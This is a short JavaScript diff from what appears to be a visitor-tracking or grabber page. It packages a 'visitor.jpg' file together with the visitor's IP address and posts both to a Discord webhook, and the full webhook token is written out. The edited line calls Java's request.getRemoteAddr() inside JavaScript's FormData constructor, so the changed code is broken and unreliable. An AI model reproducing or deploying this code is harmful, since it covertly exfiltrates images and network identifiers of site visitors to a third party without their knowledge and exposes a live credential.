@@ -174,8 +174,8 @@
     var file = new File([blob],
      'visitor.jpg');
     
-    var formData = new FormData();
-    formData.append('file', file + json.ip);
+    var formData = new FormData(request.getRemoteAddr());
+    formData.append('file', file);
     
     fetch(
       'https://discord.com/api/webhooks/1110072092826808390/IR34WYbMbUzKWKv2ade5O7m7JEQfzhpsFgOCzAql57-ViE5Rcs57JLUwnCBYboKH78kj', {
